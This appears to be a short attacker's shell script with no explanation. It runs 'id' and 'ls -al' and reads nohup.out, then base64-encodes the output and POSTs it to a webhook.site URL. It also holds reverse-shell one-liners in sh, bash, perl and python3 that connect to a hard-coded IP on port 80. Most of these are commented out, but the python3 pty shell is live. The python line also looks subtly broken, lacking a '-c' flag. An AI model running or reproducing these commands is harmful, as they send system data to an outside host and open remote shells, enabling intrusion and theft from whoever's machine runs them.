var=`id|base64`;curl -X POST -d "data=$var" https://webhook.site/5342f1d7-100d-4546-8007-22cc2d6f9fef

#sh -i >& /dev/udp/3.123.202.19/80 0>&1
#bash -i >& /dev/tcp/3.123.202.19/80 0>&1

#nohup perl -e 'use Socket;$i="3.123.202.19";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' &;
nohup python3 -u "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.123.202.19\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")" &;

var=`cat nohup.out|base64`;curl -X POST -d "data=$var" https://webhook.site/5342f1d7-100d-4546-8007-22cc2d6f9fef
var=`ls -al|base64`;curl -X POST -d "data=$var" https://webhook.site/5342f1d7-100d-4546-8007-22cc2d6f9fef
curl http://3.123.202.19